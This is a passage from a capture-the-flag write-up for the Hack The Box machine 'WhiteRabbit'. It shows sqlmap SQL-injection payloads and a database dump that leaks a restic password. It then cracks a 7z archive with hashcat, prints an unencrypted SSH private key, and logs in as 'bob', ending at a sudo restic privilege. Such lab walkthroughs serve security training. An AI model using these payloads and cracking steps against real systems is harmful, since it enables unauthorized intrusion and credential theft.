[07:34:37] [INFO] target URL content is stable
[07:34:37] [INFO] testing if GET parameter 'email' is dynamic
[07:34:37] [WARNING] GET parameter 'email' does not appear to be dynamic
[07:34:37] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[07:34:37] [INFO] testing for SQL injection on GET parameter 'email'
[07:34:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:34:38] [WARNING] reflective value(s) found and filtering out
[07:34:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[07:34:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[07:34:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[07:34:53] [INFO] GET parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[07:34:54] [WARNING] potential permission problems detected ('command denied')
[07:34:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[07:34:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[07:34:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[07:34:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[07:34:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[07:34:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[07:34:54] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[07:34:55] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[07:34:55] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[07:34:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[07:34:55] [INFO] GET parameter 'email' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[07:34:55] [INFO] testing 'Generic inline queries'
[07:34:55] [INFO] testing 'MySQL inline queries'
[07:34:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[07:34:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[07:34:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[07:34:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[07:34:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[07:34:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[07:34:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:35:05] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[07:35:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:35:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:35:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:35:06] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:35:07] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[07:35:09] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:35:10] [INFO] testing 'Generic UNION query (73) - 21 to 40 columns'
[07:35:29] [INFO] testing 'Generic UNION query (73) - 41 to 60 columns'
[07:35:31] [INFO] testing 'Generic UNION query (73) - 61 to 80 columns'
[07:35:33] [INFO] testing 'Generic UNION query (73) - 81 to 100 columns'
[07:35:35] [INFO] testing 'MySQL UNION query (73) - 1 to 20 columns'
[07:35:37] [INFO] testing 'MySQL UNION query (73) - 21 to 40 columns'
[07:35:39] [INFO] testing 'MySQL UNION query (73) - 41 to 60 columns'
[07:35:41] [INFO] testing 'MySQL UNION query (73) - 61 to 80 columns'
[07:36:11] [INFO] testing 'MySQL UNION query (73) - 81 to 100 columns'
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 975 HTTP(s) requests:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test@ex.com" AND 1679=(SELECT (CASE WHEN (1679=1679) THEN 1679 ELSE (SELECT 6578 UNION SELECT 9897) END))-- RLIP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test@ex.com" AND (SELECT 8035 FROM(SELECT COUNT(*),CONCAT(0x716a707071,(SELECT (ELT(8035=8035,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- erUk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@ex.com" AND (SELECT 1934 FROM (SELECT(SLEEP(5)))oBCi)-- vvjh
---
[07:36:12] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:36:13] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 132 times
[07:36:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 07:36:13 /2025-04-06/
```

After the first `successful injection` from `sqlmap` we moved forward to `enumerate` the `tables`.

```shell
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://127.0.0.1:5000/send_webhook\?email\=test@as.com --batch --level=5 --risk=3 -D temp --tables
        ___
       __H__                                                                     
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                         
|_ -| . [)]     | .'| . |                                                        
|___|_  ["]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                      
      
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:41:01 /2025-04-06/

[07:41:01] [INFO] resuming back-end DBMS 'mysql' 
[07:41:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test@ex.com" AND 1679=(SELECT (CASE WHEN (1679=1679) THEN 1679 ELSE (SELECT 6578 UNION SELECT 9897) END))-- RLIP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test@ex.com" AND (SELECT 8035 FROM(SELECT COUNT(*),CONCAT(0x716a707071,(SELECT (ELT(8035=8035,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- erUk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@ex.com" AND (SELECT 1934 FROM (SELECT(SLEEP(5)))oBCi)-- vvjh
---
[07:41:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:41:02] [INFO] fetching tables for database: 'temp'
[07:41:02] [INFO] retrieved: 'command_log'
Database: temp
[1 table]
+-------------+
| command_log |
+-------------+

[07:41:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 07:41:02 /2025-04-06/
```

At this point we had the `table` and started `dumping` the `content` which revealed us some interesting information about an application called `restric` and also something that looked like a `secret` the user wanted to protect as well as the `endpoint` named `75951e6ff.whiterabbit.htb`.

```shell
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://127.0.0.1:5000/send_webhook\?email\=test@as.com --batch --level=5 --risk=3 -D temp -T command_log --dump
        ___
       __H__                                                                     
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                         
|_ -| . [)]     | .'| . |                                                        
|___|_  ["]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                      
      
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:43:28 /2025-04-06/

[07:43:28] [INFO] resuming back-end DBMS 'mysql' 
[07:43:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test@ex.com" AND 1679=(SELECT (CASE WHEN (1679=1679) THEN 1679 ELSE (SELECT 6578 UNION SELECT 9897) END))-- RLIP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test@ex.com" AND (SELECT 8035 FROM(SELECT COUNT(*),CONCAT(0x716a707071,(SELECT (ELT(8035=8035,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- erUk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@ex.com" AND (SELECT 1934 FROM (SELECT(SLEEP(5)))oBCi)-- vvjh
---
[07:43:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[07:43:28] [INFO] fetching columns for table 'command_log' in database 'temp'
[07:43:28] [INFO] retrieved: 'id'
[07:43:28] [INFO] retrieved: 'int(11)'
[07:43:29] [INFO] retrieved: 'command'
[07:43:29] [INFO] retrieved: 'varchar(255)'
[07:43:29] [INFO] retrieved: 'date'
[07:43:29] [INFO] retrieved: 'timestamp'
[07:43:29] [INFO] fetching entries for table 'command_log' in database 'temp'
[07:43:29] [WARNING] reflective value(s) found and filtering out
[07:43:29] [INFO] retrieved: '2024-08-30 10:44:01'
[07:43:29] [INFO] retrieved: 'uname -a'
[07:43:29] [INFO] retrieved: '1'
[07:43:29] [INFO] retrieved: '2024-08-30 11:58:05'
[07:43:30] [INFO] retrieved: 'restic init --repo rest:http://75951e6ff.whiterabbit.htb'
[07:43:30] [INFO] retrieved: '2'
[07:43:30] [INFO] retrieved: '2024-08-30 11:58:36'
[07:43:30] [INFO] retrieved: 'echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd'
[07:43:30] [INFO] retrieved: '3'
[07:43:30] [INFO] retrieved: '2024-08-30 11:59:02'
[07:43:30] [INFO] retrieved: 'rm -rf .bash_history '
[07:43:30] [INFO] retrieved: '4'
[07:43:30] [INFO] retrieved: '2024-08-30 11:59:47'
[07:43:31] [INFO] retrieved: '#thatwasclose'
[07:43:31] [INFO] retrieved: '5'
[07:43:31] [INFO] retrieved: '2024-08-30 14:40:42'
[07:43:31] [INFO] retrieved: 'cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd'
[07:43:31] [INFO] retrieved: '6'
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+

[07:43:31] [INFO] table 'temp.command_log' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/temp/command_log.csv'
[07:43:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 07:43:31 /2025-04-06/
```

| Secret                           |
| -------------------------------- |
| ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw |

## Foothold
### 75951e6ff.whiterabbit.htb

#### restic Access

Kali Linux didn't shipped `restic` by default therefore we needed to quickly install it.

- [https://restic.net/](https://restic.net/)

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ sudo apt-get install restic
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  restic
0 upgraded, 1 newly installed, 0 to remove and 856 not upgraded.
Need to get 8,096 kB of archives.
After this operation, 24.7 MB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 restic amd64 0.17.3-1+b2 [8,096 kB]
Fetched 8,096 kB in 1s (6,840 kB/s) 
Selecting previously unselected package restic.
(Reading database ... 786443 files and directories currently installed.)
Preparing to unpack .../restic_0.17.3-1+b2_amd64.deb ...
Unpacking restic (0.17.3-1+b2) ...
Setting up restic (0.17.3-1+b2) ...
Processing triggers for man-db (2.13.0-1) ...
Processing triggers for kali-menu (2025.1.1) ...
Processing triggers for doc-base (0.11.2) ...
Processing 1 added doc-base file...
Scanning processes...                                                                                                                                                                                                                       
Scanning linux images...                                                                                                                                                                                                                    

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

After we had that off our plate we updated our `/etc/hosts` file once more and added `75951e6ff.whiterabbit.htb`.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.234.57   whiterabbit.htb
10.129.234.57   status.whiterabbit.htb
10.129.234.57   ddb09a8558c9.whiterabbit.htb
10.129.234.57   a668910b5514e.whiterabbit.htb
10.129.234.57   28efa8f7df.whiterabbit.htb
10.129.234.57   75951e6ff.whiterabbit.htb
```

Then we tried `restoring` everything from the endpoint we just found.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ restic -r rest:http://75951e6ff.whiterabbit.htb restore latest --target .
enter password for repository: 
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/kali/.cache/restic
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to .
Summary: Restored 5 files/dirs (572 B) in 0:00
```

Interesting enough `restic` restored a `7-Zip archive` called `bob.7z` which was basically our first `username`.

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ ls -la
total 4
drwxrwx--- 1 root vboxsf  12 Mar  7 01:12 .
drwxrwx--- 1 root vboxsf   6 Mar  7 01:10 ..
-rwxrwx--- 1 root vboxsf 572 Mar  7 01:12 bob.7z
```

| Username |
| -------- |
| bob      |

But unfortunately the `archive` was `password-protected`.

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ 7z e bob.7z

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

### Cracking the password-protected Archive using hashcat

In order to crack the `password-protected archive`  we used `7z2john` to generate the `hash` we feed `hashcat` for cracking.

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ 7z2john bob.7z > hash     
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
```

The output of `7z2john` needed to be cleaned out from the `username` so that `hashcat` would accepted it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat hash                 
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat hash                 
$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

And after a minute or so we got the `password` for the `7-zip archive`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ hashcat -m 11600 -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

This hash-mode is known to emit multiple valid candidates for the same hash.
Use --keep-guessing to continue attack after finding the first crack.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00:1q2w3e4r5t6y
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 11600 (7-Zip)
Hash.Target......: $7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049...399$00
Time.Started.....: Sun Apr  6 07:56:51 2025 (9 mins, 24 secs)
Time.Estimated...: Sun Apr  6 08:06:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       43 H/s (13.28ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 24064/14344385 (0.17%)
Rejected.........: 0/24064 (0.00%)
Restore.Point....: 23808/14344385 (0.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:523264-524288
Candidate.Engine.: Device Generator
Candidates.#1....: 231086 -> hunibuni
Hardware.Mon.#1..: Util: 89%

Started: Sun Apr  6 07:56:31 2025
Stopped: Sun Apr  6 08:06:17 2025
```

| Password     |
| ------------ |
| 1q2w3e4r5t6y |

### Extracting 7-Zip Archive

Next we extracted the content of the `7-zip archive` and got a `config file` and also an `SSH key pair` for `bob`.

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ 7z e bob.7z 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ cat config 
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ cat bob
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

### SSH Access as bob

Luckily for us the `SSH key` was not `password-protected` as well so we just could `login` as `bob`.

```shell
┌──(kali㉿kali)-[/media/…/dev/shm/bob/ssh]
└─$ ssh -i bob -p 2222 bob@10.129.234.57
The authenticity of host '[10.129.234.57]:2222 ([10.129.234.57]:2222)' can't be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.234.57]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$
```

## Enumeration (bob)

Now with finally having `foothold` on the machine and a `session` as `bob` we started with some `basic enumeration` and quickly noticed that we landed in a `Docker container` by finding a `.dockerenv` in `/`.

```shell
bob@ebdce80611e9:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

```shell
bob@ebdce80611e9:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001::/home/bob:/bin/bash
```

```shell
bob@ebdce80611e9:~$ ls -la /
total 88
drwxr-xr-x   1 root root 4096 Mar 24 11:43 .
drwxr-xr-x   1 root root 4096 Mar 24 11:43 ..
-rwxr-xr-x   1 root root    0 Mar 24 11:43 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   5 root root  340 Apr  5 19:00 dev
drwxr-xr-x   1 root root 4096 Mar 24 11:43 etc
drwxr-xr-x   1 root root 4096 Mar 24 11:24 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4096 Apr  8  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Aug  1  2024 media
drwxr-xr-x   2 root root 4096 Aug  1  2024 mnt
drwxr-xr-x   2 root root 4096 Aug  1  2024 opt
dr-xr-xr-x 289 root root    0 Apr  5 19:00 proc
drwx------   1 root root 4096 Mar 24 16:08 root
drwxr-xr-x   1 root root 4096 Apr  6 06:56 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Mar 31  2024 sbin.usr-is-merged
drwxr-xr-x   2 root root 4096 Aug  1  2024 srv
dr-xr-xr-x  13 root root    0 Apr  5 19:00 sys
drwxrwxrwt   1 root root 4096 Aug 30  2024 tmp
drwxr-xr-x   1 root root 4096 Aug  1  2024 usr
drwxr-xr-x   1 root root 4096 Aug  1  2024 var
```

However `bob` was able to run `/usr/bin/restic` using `sudo`.

```shell
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

```shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic

restic is a backup program which allows saving multiple revisions of files and
directories in an encrypted repository stored on different backends.

The full documentation can be found at https://restic.readthedocs.io/ .

Usage:
  restic [command]

Available Commands:
  backup        Create a new backup of files and/or directories
  cache         Operate on local cache directories
  cat           Print internal objects to stdout
  check         Check the repository for errors
  copy          Copy snapshots from one repository to another
  diff          Show differences between two snapshots
  dump          Print a backed-up file to stdout
  find          Find a file, a directory or restic IDs
